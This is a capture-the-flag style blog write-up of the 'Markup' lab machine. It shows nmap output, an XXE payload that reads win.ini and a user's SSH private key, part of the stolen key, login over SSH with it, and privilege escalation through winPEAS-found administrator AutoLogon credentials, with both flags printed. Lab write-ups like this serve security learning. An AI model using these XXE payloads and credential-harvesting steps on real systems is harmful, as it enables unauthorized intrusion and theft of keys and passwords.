---
title: "Writeup: Markup"
date: 2021-01-18T22:34:30-04:00
categories:
  - Blog
  - Writeup
tags:
  - included
  - windows
  - update
  - nmap
  - LFI
  - XXE
  - XML
  - cheatsheet
  - smb server
  - enum
  - winPEAS.exe
---

Here are notes from the named target:
Target is Windows
Host name Markup
IP 10.10.10.49

#Enumeration
Start with simple nmap - nmap -A -v 10.10.10.49 or nmap -sV -sC -p- -Pn 10.10.10.49 --min-rate=10000
```yaml
┌──(root💀kali)-[~]
└─# nmap -sV -sC -p- -Pn 10.10.10.49 --min-rate=10000                                        1 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-19 23:31 EST
Nmap scan report for 10.10.10.49
Host is up (0.066s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```
With ports 80 and 443 open use browser to check web page which has login screen. Try out all collected credentials and find that Daniel and password from the target Included work to log you into the site. Try on the SSH server is nogo.
```yaml
# ssh daniel@10.10.10.49                                                       
The authenticity of host '10.10.10.49 (10.10.10.49)' can't be established.
ECDSA key fingerprint is SHA256:+ApFLFVrSG3bOU5dk/VwAR8tNLb+f4QVdkbysGCBSrc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.49' (ECDSA) to the list of known hosts.
daniel@10.10.10.49's password: 
Permission denied, please try again.
daniel@10.10.10.49's password: 
Permission denied, please try again.
daniel@10.10.10.49's password: 

```
Web page exploring notices that a cookie - PHPSESSID is set when Daniel logs in

Start up Burp and capture some Order process traffic we see that orders are sent to server in xml
```yaml
Cookie: PHPSESSID=e9rvi3an2fa6pilhpeq6g5efas
<?xml version = "1.0"?><order><quantity></quantity><item>Home Appliances</item><address></address></order>
```

So to test to see if it is vulnerable send this back instead :
```yaml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
```
As data is processed in XML format, there is good chance of an XXE (XML External Entity) vulnerability. An XXE vulnerability occurs due to unsafe parsing of XML input, leading to LFI as well as RCE. Testing with the following payload yields good results.

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>

LFI Cheat sheet - https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/

SSH server port. SSH private keys are usually stored in C:\Users\username\.ssh\id_rsa  and ssh is open plus we know we have a user named Daniel so if he has a ssh key stored on the server we can ssh in using the key instead of his password - lets use LFI to check that location. Using the process of submitting an Order and replacing what the pages sends with the LFI string below and then catch the RESPONSe in BURP

```yaml
REQUEST

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/Users/Daniel/.ssh/id_rsa'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>

RESPONSE
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEArJgaPRF5S49ZB+Ql8cOhnURSOZ4nVYRSnPXo6FIe9JnhVRrdEiMi
...
vRCD2pONhqZOjinGfGUMml1UaJZzxZs6F9hmOz+WAek89dPdD4rBCU2fS3J7bs9Xx2PdyA
m3MVFR4sN7a1cAAAANZGFuaWVsQEVudGl0eQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

#The exfiltration was successful and the private key can be used to login to the server as daniel.

#Where to put the file in Kali. SSH keys are found in ~/.ssh. Create a fille named id_rsa and then paste the key into it.

Save that file and then shange it's permissions so it can be used with:

chmod 400 id_rsa

Connect to the server via SSH with this
```yaml
ssh -i id_rsa daniel@10.10.10.49
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
032d2fc8952a8c24e39c8f0ee9918ef7
```

Now to Enum the server whithin:

https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

Start a http server in your enum folder then wget the file to the windows server and run it

+] Looking for AutoLogon credentials                                          
    Some AutoLogon credentials were found!!                                           
    DefaultUserName               :  Administrator
    DefaultPassword               :  Yhk}QE&j<3M
    
SSH to the server and use the credentials found with winenum.exe

 Directory of C:\Users\Administrator\Desktop

03/05/2020  06:33 AM    <DIR>          .
03/05/2020  06:33 AM    <DIR>          ..
03/05/2020  06:33 AM                70 root.txt
               1 File(s)             70 bytes
               2 Dir(s)  13,578,170,368 bytes free

administrator@MARKUP C:\Users\Administrator\Desktop>more root.txt
f574a3e7650cebd8c39784299cb570f8

SMB SERVER

If WGET is not available you can run SMB server on Kali and use the Native net commands to get the file transferred or SCP
```yaml
scp -i ~/.ssh/id_rsa winPEAS64.exe daniel@10.10.10.49:c:/users/daniel/winPEAS64.exe
```

    

























